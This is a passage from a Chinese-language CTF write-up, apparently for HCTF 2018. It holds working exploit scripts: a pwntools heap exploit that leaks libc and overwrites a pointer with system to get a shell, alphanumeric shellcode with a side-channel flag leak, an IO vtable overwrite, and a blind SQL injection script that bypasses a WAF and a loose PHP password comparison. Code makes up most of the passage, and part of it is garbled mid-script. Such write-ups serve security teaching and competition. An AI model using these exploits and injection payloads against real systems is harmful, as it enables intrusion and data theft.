    def main():
        # Your exploit script goes here
        p.ru('name: ')
        p.sl('(unreachable)')
        # leak libc
        mkfile(p, '(unreachable)/tmp', 'a' * (0x100 - 1) + '/')
        mkfile(p, 'buf%d' % 1, str(1) * 0xf0)
        mkfile(p, 'buf%d' % 2, str(2) * 0xf0)
        payload = p64(0) + p64(0x101) + p64(0x603180 - 0x18) + p64(0x603180 - 0x10)
        payload = payload.ljust(0xf0, '3')
        mkfile(p, 'buf%d' % 3, str(3) * 0xf0)
        libc_addr = u64(cat(p, '(unreachable)/tmp')[0x100:].strip('\x0a').ljust(8, '\x00'))
        libc_base = libc_addr - 0x3c5620
        mkfile(p, 'buf3', payload)
        p.info('libc base 0x%x' % libc_base)
        for i in range(8):
            payload = '../../' + 'x' * (8 - i)
            mkdir(p, payload)
        payload = '../../' + chr(0x10) + chr(0x1)
        mkdir(p, payload)
        mkdir(p, '../../')
        mkfile(p, 'test', 'test')
        mkfile(p, 'buf3', 'a' * 0x18 + p64(0x603060) + p32(0x100)[:3]) # opendir
        libc = ELF('./libc-2.23.so')
        system_addr = libc_base + libc.symbols['system']
        if DEBUG:
            gdb.attach(p.pid, gdbscript='b *0x401a64')
        mkfile(p, 'buf3', p64(system_addr))
        p.sl('ls /bin/sh')
        p.irt()
    if __name__ == '__main__':
        main()
### christmas
需要用alphanumeric的shellcode去调用dlopen的函数，比较麻烦，所幸找到了encoder：  
encoder直接用不了（因为针对windows），改动一下之后，因为base addr的问题，加上42 (sxor rax,
'2')，修正base，就可以用了。  
剩下的asm就是直接dlopen -> dlsym(环境一样可以找到)，不过由于没有输出，只能侧信道，通过死循环判断是否成功，二分法一下搞定。yix
    #! /usr/bin/env python2
    # -*- coding: utf-8 -*-    # vim:fenc=utf-8
    #
    # Copyright © 2018 anciety 
    #
    # Distributed under terms of the MIT license.
    import sys
    import os
    import os.path
    from pwn import *
    context(os='linux', arch='amd64', log_level='debug')
    context.terminal = ['lxterminal', '-e']
    # synonyms for faster typing
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    if len(sys.argv) > 2:
        DEBUG = 0
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        p = remote(HOST, PORT)
    else:
        DEBUG = 1
        if len(sys.argv) == 2:
            PATH = sys.argv[1]
        p = process(PATH)
    PAYLOAD = '''
    mov eax, 0x66666866
    sub eax, 0x66666066
    add rsp, rax
    mov eax, 0x10703078
    sub eax, 0x10101010
    mov r12, [rax]
    mov eax, 0x101010E0
    sub eax, 0x10101010
    lea r13, [r12 + rax]
    xor esi, esi
    inc esi
    push 0x6F732E67
    mov rax, 0x616C6662696C2F2E
    push rax
    lea rdi, [rsp]
    call r12
    mov rdi, rax
    mov rax, 0x101010474343416F
    mov rdx, 0x1010101010101010
    sub rax, rdx
    push rax
    mov rax, 0x7365795F67616C66
    push rax
    lea rsi, [rsp]
    call r13
    call rax
    cmp byte ptr ds:[rax+{0}], {1}
    die:
    jg die
    int3
    '''
    def get_shellcode(idx, ch):
        payload = PAYLOAD.format(hex(idx), hex(ord(ch)))
        shellcode = asm(payload)
        with process('python2 alpha3/ALPHA3.py x64 ascii mixedcase RAX'.split()) as alpha:
            alpha.s(shellcode)
            alpha.shutdown()
            encoded = alpha.r().strip()
            return encoded
    def is_greater(idx, ch):
        with remote(HOST, PORT) as r:
        #with process('./christmas') as r:
            r.ru('token:')
            r.sl('DN2WQ9iOvvAGyRxDC4KweQ2L9hAlhr6j')
            r.ru('find it??\n')
            r.sl(get_shellcode(idx, ch))
            try:
                r.rl(timeout=1)
            except:
                print('%d th is not greater than %s' % (idx, ch))
                return False
            print('%d th is greater than %s' % (idx, ch))
            return True
    def main():
        # Your exploit script goes here
        flag = ''
        for i in range(0x20):
            l = 0x10
            r = 0x7f
            while l >8)&0xff)
        to_write(target+2,(one>>16)&0xff)
        to_write(vtable+1,(target>>8)&0xff)
        to_write(io_stdout+0x28,0xff)
        irt()
## Web
### kzone
www.zip可以下载到web源码，然后阅读源码，发现include/member.php提取了$_COOKIE['login_data']用于登录验证
    $login_data = json_decode($_COOKIE['login_data'], true);
    $admin_user = $login_data['admin_user'];
    $udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
    if ($udata['username'] == '') {
        setcookie("islogin", "", time() - 604800);
        setcookie("login_data", "", time() - 604800);
    }
    $admin_pass = sha1($udata['password'] . LOGIN_KEY);
    if ($admin_pass == $login_data['admin_pass']) {
        $islogin = 1;
    } else {
        setcookie("islogin", "", time() - 604800);
        setcookie("login_data", "", time() - 604800);
    }
这里密码判断用的是“==”可以用数字与字符串弱等于绕过，构造json串，其中密码从数字0开始爆破即可，爆破到65的时候成功登入。  
login_data为
    {"admin_user":"admin","admin_pass":65}
然后这里的username还可以注入，不过有waf拦截，因此需要绕过，需要注意的是or也被过滤了，因此information_schema不能用，所以需要用mysql.innodb_table_stats来查数据库名表名，发现F1444g表，不过不知道列名，这里用*发现就可以了，应该是只有一列，exp如下：
    import requests
    dic = list('1234567890abcdefghijklmnopqrstuvwxyz[]<>@!-~?=_()*{}#. /')
    ans = ''
    for pos in range(1,1000):
        flag = 1
        for c in dic:
            payload = "admin'and(strcmp(right((select/**/*/**/from/**/F1444g/**/limit/**/0,1),%d),'%s'))||'"%(pos,c+ans)
            cookies = {'islogin':'1','PHPSESSID':'olvurpb8sqldthvnetdd0elf65','login_data':'{"admin_user":"%s","admin_pass":65}'%payload}
            resp = requests.get("http://kzone.2018.hctf.io/include/common.php",cookies=cookies)